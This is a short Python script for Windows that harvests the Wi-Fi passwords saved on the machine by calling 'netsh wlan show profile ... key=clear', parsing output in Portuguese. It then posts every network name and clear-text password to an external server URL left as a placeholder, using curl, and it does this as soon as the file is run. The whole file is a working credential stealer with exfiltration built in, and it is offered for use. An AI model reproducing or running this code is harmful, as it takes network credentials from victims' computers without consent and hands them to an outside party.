import subprocess
import re
from typing import Any, Dict, List

MY_SERVER_URL = "INSERT YOUR SERVER URL"


def _get_wlan_profiles() -> List[str]:
    command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True, text=True).stdout
    command_output = command_output.split("Todos os Perfis de Usu rios: ")
    return [network_name.strip() for network_name in command_output[1:]]

def _get_profile_password(network_name) -> str | None:
    profile_info = subprocess.run(["netsh", "wlan", "show", "profile", network_name], capture_output = True, text=True).stdout
    if re.search("Chave de seguran‡a           : Presente", profile_info):
        profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", network_name, "key=clear"], capture_output = True, text=True).stdout
        return (re.search("Conte£do da Chave            : (.*)", profile_info_pass)).group(1)
    return None
        

def _get_available_networks_and_passwords() -> List[Dict[str, Any]]:
    cracked_wifi_list: List[Dict[str, Any]] = []
    
    for network_name in _get_wlan_profiles():
        cracked_wifi_list.append({"ssid": network_name, "password": _get_profile_password(network_name)})
    return cracked_wifi_list

def send_available_network_credentials_to_external_server() -> None:
    subprocess.run(["curl", "POST", MY_SERVER_URL, "-H", "Content-Type: application/json", "-d", f"{_get_available_networks_and_passwords()}"])
   

if __name__ == "__main__":
    send_available_network_credentials_to_external_server()
